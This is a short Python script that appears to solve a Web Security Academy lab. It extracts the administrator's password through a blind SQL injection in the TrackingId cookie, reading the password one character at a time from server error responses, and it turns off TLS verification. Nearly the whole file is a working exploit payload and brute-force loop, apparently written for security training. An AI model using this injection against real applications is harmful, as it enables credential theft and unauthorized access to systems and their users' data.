import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


url = "https://0a51002f04dd90d980bd03ab00a60085.web-security-academy.net/filter?category=Tech+gifts"

chars="abcdefghijklmnopqrstuvwxyz0123456789"
password=[]
for index in range(1,21):
    print("1")
    for c in chars:
        payload=f"' || (select case when substr(password,{index},1)='{c}' then to_char(1/0) else '' end from users where username='administrator')--"

        r = requests.get(url, cookies={"TrackingId":f"wW5i876igizsvood{payload}", "session":"vt6Ivom8ttakN2jXzr3tEBYhqR7prB3v"}, proxies=proxies, verify=False, timeout=10)

        if r.status_code==500:
            password.append(c)
            break


print("".join(password))